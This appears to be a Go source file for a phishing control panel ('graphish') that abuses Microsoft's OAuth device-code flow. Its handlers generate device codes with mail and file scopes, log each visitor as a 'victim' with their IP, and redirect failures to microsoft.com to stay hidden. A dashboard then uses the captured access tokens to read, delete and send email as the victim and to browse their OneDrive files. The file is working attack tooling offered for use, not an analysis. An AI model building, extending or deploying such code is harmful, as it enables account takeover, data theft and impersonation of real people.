package app

import (
	"bytes"
	"encoding/json"
	"fmt"
	"graphish/db"
	"io"
	"net"
	"net/http"
	"net/url"
	"runtime/debug"

	"github.com/gorilla/mux"
	"github.com/gotuna/gotuna"
	"github.com/morkid/paginate"
	"gorm.io/gorm"
)

type DeviceCodeResponse struct {
	DeviceCode      string `json:"device_code"`
	UserCode        string `json:"user_code"`
	VerificationURI string `json:"verification_uri"`
	ExpiresIn       int    `json:"expires_in"`
	Interval        int    `json:"interval"`
	Message         string `json:"message"`
}

type UserInfo struct {
	ID                string `json:"id"`
	DisplayName       string `json:"displayName"`
	UserPrincipalName string `json:"userPrincipalName"`
	Mail              string `json:"mail"`
}

var pg = paginate.New(&paginate.Config{
	DefaultSize: 10,
})

func handlerNotFound() http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusNotFound)
	})
}
func handlerError(app App) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusInternalServerError)
		app.NewTemplatingEngine().
			Set("error", "TODO"). // TODO: show error
			Set("stacktrace", string(debug.Stack())).
			Render(w, r, "error.html")
	})
}

// handle the login route
func handlerLogin(app App) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		id, _ := app.Session.GetUserID(r)
		if id != "" {
			//if the user is already logged in, then redirect to the dashboard
			http.Redirect(w, r, "/dashboard", http.StatusFound)
			return
		}
		if http.MethodPost == r.Method {
			//Authenticate the user
			usr, err := app.UserRepository.Authenticate(w, r)
			if err != nil {
				app.Session.Flash(w, r, gotuna.FlashMessage{
					Kind:    "danger",
					Message: err.Error(),
				})
				http.Redirect(w, r, "/", http.StatusFound)
				return
			}
			//if the user is authenticated, then redirect to the dashboarb
			app.Session.SetUserID(w, r, usr.GetID())
			app.Session.Flash(w, r, gotuna.FlashMessage{
				Kind:    "success",
				Message: "Login successful",
			})
			http.Redirect(w, r, "/dashboard", http.StatusFound)
			return
		}
		app.NewTemplatingEngine().Render(w, r, "app.html", "login.html")
	})
}

// logout handler
func handleLogout(app App) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		app.Session.Destroy(w, r)
		http.Redirect(w, r, "/", http.StatusFound)
	})
}

// generate device code
func generate(app App, Db *gorm.DB, client_id string) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		requestURL := "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode"
		// Prepare form data
		data := url.Values{}
		data.Set("client_id", client_id)
		//redirect URI is needed for device code flow
		data.Set("scope", "https://graph.microsoft.com/user.read https://graph.microsoft.com/files.read https://graph.microsoft.com/mail.send https://graph.microsoft.com/mail.readwrite offline_access")
		// Create request
		req, err := http.NewRequest("POST", requestURL, bytes.NewBufferString(data.Encode()))
		if err != nil {
			fmt.Println("Error creating request:", err)
			http.Redirect(w, r, "https://www.microsoft.com/", http.StatusFound)
			return
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		// Send request
		client := &http.Client{}
		resp, err := client.Do(req)
		if err != nil {
			fmt.Println("Error sending request:", err)
			http.Redirect(w, r, "https://www.microsoft.com/", http.StatusFound)
			return
		}
		defer resp.Body.Close()
		// Read response
		body, err := io.ReadAll(resp.Body)
		if err != nil {
			fmt.Println("Error reading response:", err)
			http.Redirect(w, r, "https://www.microsoft.com/", http.StatusFound)
			return
		}
		if resp.StatusCode != 200 {
			fmt.Println("Error response status:", resp.StatusCode)
			fmt.Println("Response body:", string(body))
			http.Redirect(w, r, "https://www.microsoft.com/", http.StatusFound)
			return
		}
		// Parse response
		var deviceCodeResp DeviceCodeResponse
		if err := json.Unmarshal(body, &deviceCodeResp); err != nil {
			fmt.Println("Error parsing response:", err)
			http.Redirect(w, r, "https://www.microsoft.com/", http.StatusFound)
			return
		}
		verification_uri := deviceCodeResp.VerificationURI
		user_code := deviceCodeResp.UserCode
		ip, _, _ := net.SplitHostPort(r.RemoteAddr)
		err = db.CreateNewVictim(Db, deviceCodeResp.DeviceCode, ip, "common")
		if err != nil {
			fmt.Println("Error creating new victim:", err)
			http.Redirect(w, r, "https://www.microsoft.com/", http.StatusFound)
			return
		}
		app.NewTemplatingEngine().Set("verification_uri", verification_uri).Set("user_code", user_code).Render(w, r, "generate.html")
	})
}

//doesn't work anymore even with app verification
/*
func generateForWork(app App, Db *gorm.DB, client_id string) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		domain := mux.Vars(r)["domain"]
		requestURL := fmt.Sprintf("https://login.microsoftonline.com/%s/v2.0/.well-known/openid-configuration", domain)
		// send request to get the tenant ID
		resp, err := http.Get(requestURL)
		if err != nil {
			http.Redirect(w, r, "https://www.microsoft.com/", http.StatusFound)
			return
		}
		defer resp.Body.Close()
		if resp.StatusCode != http.StatusOK {
			http.Redirect(w, r, "https://www.microsoft.com/", http.StatusFound)
			return
		}
		var tenantInfo map[string]interface{}
		if err := json.NewDecoder(resp.Body).Decode(&tenantInfo); err != nil {
			http.Redirect(w, r, "https://www.microsoft.com/", http.StatusFound)
			return
		}
		requestURL, ok := tenantInfo["device_authorization_endpoint"].(string)
		if !ok {
			http.Redirect(w, r, "https://www.microsoft.com/", http.StatusFound)
			return
		}
		// Prepare form data
		data := url.Values{}
		data.Set("client_id", client_id)
		data.Set("scope", "https://graph.microsoft.com/files.read offline_access")
		// Create request
		req, err := http.NewRequest("POST", requestURL, bytes.NewBufferString(data.Encode()))
		if err != nil {
			http.Redirect(w, r, "https://www.microsoft.com/", http.StatusFound)
			return
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		// Send request
		client := &http.Client{}
		resp, err = client.Do(req)
		if err != nil {
			http.Redirect(w, r, "https://www.microsoft.com/", http.StatusFound)
			return
		}
		defer resp.Body.Close()
		// Read response
		body, err := io.ReadAll(resp.Body)
		if err != nil {
			http.Redirect(w, r, "https://www.microsoft.com/", http.StatusFound)
			return
		}
		if resp.StatusCode != 200 {
			http.Redirect(w, r, "https://www.microsoft.com/", http.StatusFound)
			return
		}
		// Parse response
		var deviceCodeResp DeviceCodeResponse
		if err := json.Unmarshal(body, &deviceCodeResp); err != nil {
			http.Redirect(w, r, "https://www.microsoft.com/", http.StatusFound)
			return
		}
		verification_uri := deviceCodeResp.VerificationURI
		user_code := deviceCodeResp.UserCode
		ip, _, _ := net.SplitHostPort(r.RemoteAddr)
		tenantID := regexp.MustCompile(`https://login.microsoftonline.com/([^/]+)/oauth2/v2.0/devicecode`).FindStringSubmatch(requestURL)[1]
		if tenantID == "" {
			http.Redirect(w, r, "https://www.microsoft.com/", http.StatusFound)
			return
		}
		// Create new victim with tenant ID
		err = db.CreateNewVictim(Db, deviceCodeResp.DeviceCode, ip, tenantID)
		if err != nil {
			http.Redirect(w, r, "https://www.microsoft.com/", http.StatusFound)
			return
		}
		app.NewTemplatingEngine().Set("verification_uri", verification_uri).Set("user_code", user_code).Render(w, r, "generate.html")
	})
}
*/

func handlerDashboard(app App, base *gorm.DB) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		//get all victims
		model := base.Model(&db.Victim{})
		pageObject := pg.With(model)
		usersPage := pageObject.Request(r).Response(&[]db.Victim{})
		app.NewTemplatingEngine().Set("victims", usersPage).Render(w, r, "app.html", "dashboard.html")
	})
}

// getUserInfo gets user information using the access token
func getUserInfo(accessToken string) (*UserInfo, error) {
	requestURL := "https://graph.microsoft.com/v1.0/me"

	// Create request
	req, err := http.NewRequest("GET", requestURL, nil)
	if err != nil {
		return nil, fmt.Errorf("error creating request: %w", err)
	}

	req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", accessToken))
	req.Header.Set("Content-Type", "application/json")

	// Send request
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("error sending request: %w", err)
	}
	defer resp.Body.Close()

	// Read response
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("error reading response: %w", err)
	}

	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("error getting user info: %d - %s", resp.StatusCode, string(body))
	}

	// Parse response
	var userInfo UserInfo
	if err := json.Unmarshal(body, &userInfo); err != nil {
		return nil, fmt.Errorf("error parsing response: %w", err)
	}

	return &userInfo, nil
}

func handlerVictim(app App, Db *gorm.DB) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		vars := mux.Vars(r)
		id := vars["id"]
		var victim db.Victim
		if err := Db.First(&victim, id).Error; err != nil {
			app.Session.Flash(w, r, gotuna.FlashMessage{
				Kind:    "danger",
				Message: "Victim not found",
			})
			http.Redirect(w, r, "/dashboard", http.StatusFound)
			return
		}
		// Get user info using the access token
		userInfo, err := getUserInfo(victim.AccessToken)
		if err != nil {
			app.Session.Flash(w, r, gotuna.FlashMessage{
				Kind:    "danger",
				Message: "Error getting user info: " + err.Error(),
			})
			http.Redirect(w, r, "/dashboard", http.StatusFound)
			return
		}
		app.NewTemplatingEngine().
			Set("ID", victim.ID).
			Set("userInfo", userInfo).
			Render(w, r, "app.html", "victim.html")
	})
}

func sendMail(app App, Db *gorm.DB) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		vars := mux.Vars(r)
		id := vars["id"]
		var victim db.Victim
		if err := Db.First(&victim, id).Error; err != nil {
			app.Session.Flash(w, r, gotuna.FlashMessage{
				Kind:    "danger",
				Message: "Victim not found",
			})
			http.Redirect(w, r, "/dashboard", http.StatusFound)
			return
		}
		if r.Method == http.MethodPost {
			subject := r.FormValue("subject")
			body := r.FormValue("body")
			recipient := r.FormValue("recipient")
			if subject == "" || body == "" || recipient == "" {
				app.Session.Flash(w, r, gotuna.FlashMessage{
					Kind:    "danger",
					Message: "Subject and body cannot be empty",
				})
				http.Redirect(w, r, fmt.Sprintf("/dashboard/%s", id), http.StatusFound)
				return
			}
			err := db.SendMail(Db, victim.AccessToken, subject, body, recipient)
			if err != nil {
				app.Session.Flash(w, r, gotuna.FlashMessage{
					Kind:    "danger",
					Message: "Error sending mail: " + err.Error(),
				})
				http.Redirect(w, r, fmt.Sprintf("/dashboard/%s", id), http.StatusFound)
				return
			}
			app.Session.Flash(w, r, gotuna.FlashMessage{
				Kind:    "success",
				Message: "Mail sent successfully",
			})
			http.Redirect(w, r, fmt.Sprintf("/dashboard/%s", id), http.StatusFound)
			return
		}
		app.NewTemplatingEngine().Set("ID", victim.ID).Render(w, r, "app.html", "victim.html")
	})
}

func displayEmails(app App, Db *gorm.DB) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		vars := mux.Vars(r)
		id := vars["id"]
		var victim db.Victim
		if err := Db.First(&victim, id).Error; err != nil {
			app.Session.Flash(w, r, gotuna.FlashMessage{
				Kind:    "danger",
				Message: "Victim not found",
			})
			http.Redirect(w, r, "/dashboard", http.StatusFound)
			return
		}
		emails, err := db.ReadEmails(Db, victim.AccessToken)
		if err != nil {
			app.Session.Flash(w, r, gotuna.FlashMessage{
				Kind:    "danger",
				Message: "Error reading emails: " + err.Error(),
			})
			http.Redirect(w, r, fmt.Sprintf("/dashboard/%s", id), http.StatusFound)
			return
		}
		app.NewTemplatingEngine().
			Set("VictimID", victim.ID).
			Set("emails", emails).
			Render(w, r, "app.html", "emails.html")
	})
}

func deleteEmail(app App, Db *gorm.DB) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		vars := mux.Vars(r)
		id := vars["id"]
		emailID := vars["emailID"]
		var victim db.Victim
		if err := Db.First(&victim, id).Error; err != nil {
			app.Session.Flash(w, r, gotuna.FlashMessage{
				Kind:    "danger",
				Message: "Victim not found",
			})
			http.Redirect(w, r, "/dashboard", http.StatusFound)
			return
		}
		err := db.DeleteEmail(Db, victim.AccessToken, emailID)
		if err != nil {
			app.Session.Flash(w, r, gotuna.FlashMessage{
				Kind:    "danger",
				Message: "Error deleting email: " + err.Error(),
			})
			http.Redirect(w, r, fmt.Sprintf("/emails/%s", id), http.StatusFound)
			return
		}
		app.Session.Flash(w, r, gotuna.FlashMessage{
			Kind:    "success",
			Message: "Email deleted successfully",
		})
		http.Redirect(w, r, fmt.Sprintf("/emails/%s", id), http.StatusFound)
	})
}

func displayFiles(app App, Db *gorm.DB) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		vars := mux.Vars(r)
		id := vars["id"]
		var victim db.Victim
		if err := Db.First(&victim, id).Error; err != nil {
			app.Session.Flash(w, r, gotuna.FlashMessage{
				Kind:    "danger",
				Message: "Victim not found",
			})
			http.Redirect(w, r, "/dashboard", http.StatusFound)
			return
		}
		files, err := db.ReadFiles(Db, victim.AccessToken)
		if err != nil {
			app.Session.Flash(w, r, gotuna.FlashMessage{
				Kind:    "danger",
				Message: "Error reading files: " + err.Error(),
			})
			http.Redirect(w, r, fmt.Sprintf("/dashboard/%s", id), http.StatusFound)
			return
		}
		app.NewTemplatingEngine().
			Set("files", files).
			Set("id", id).
			Render(w, r, "app.html", "onedrive.html")
	})
}
func displayFilesinFolder(app App, Db *gorm.DB) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		vars := mux.Vars(r)
		id := vars["id"]
		var victim db.Victim
		if err := Db.First(&victim, id).Error; err != nil {
			app.Session.Flash(w, r, gotuna.FlashMessage{
				Kind:    "danger",
				Message: "Victim not found",
			})
			http.Redirect(w, r, "/dashboard", http.StatusFound)
			return
		}
		// Read files in the specified folder
		folderID := vars["folderID"]
		if folderID == "" {
			app.Session.Flash(w, r, gotuna.FlashMessage{
				Kind:    "danger",
				Message: "Folder ID is required",
			})
			http.Redirect(w, r, fmt.Sprintf("/dashboard/%s", id), http.StatusFound)
			return
		}
		// Read files in the specified folder
		files, err := db.ReadFilesinFolder(Db, victim.AccessToken, folderID)
		if err != nil {
			app.Session.Flash(w, r, gotuna.FlashMessage{
				Kind:    "danger",
				Message: "Error reading files: " + err.Error(),
			})
			http.Redirect(w, r, fmt.Sprintf("/dashboard/%s", id), http.StatusFound)
			return
		}
		app.NewTemplatingEngine().
			Set("files", files).
			Set("id", id).
			Render(w, r, "app.html", "onedrive.html")
	})
}
